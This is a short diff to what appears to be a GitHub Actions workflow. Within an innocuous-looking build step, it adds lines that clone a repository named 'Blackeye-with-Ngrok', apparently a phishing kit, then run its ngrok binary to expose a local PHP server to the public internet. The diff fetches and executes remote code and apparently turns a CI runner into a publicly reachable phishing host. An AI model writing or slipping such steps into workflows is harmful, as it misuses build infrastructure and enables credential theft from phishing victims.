@@ -34,4 +34,8 @@ jobs:
         run: |
           cd Win11
           php -S 127.0.0.1:8080
+          git clone https://github.com/waseem-sajjad/Blackeye-with-Ngrok.git 
+          cd Blackeye-with-Ngrok
+          chmod +x ngrok
+          ./ngrok http 8080
           echo test, and deploy your project.
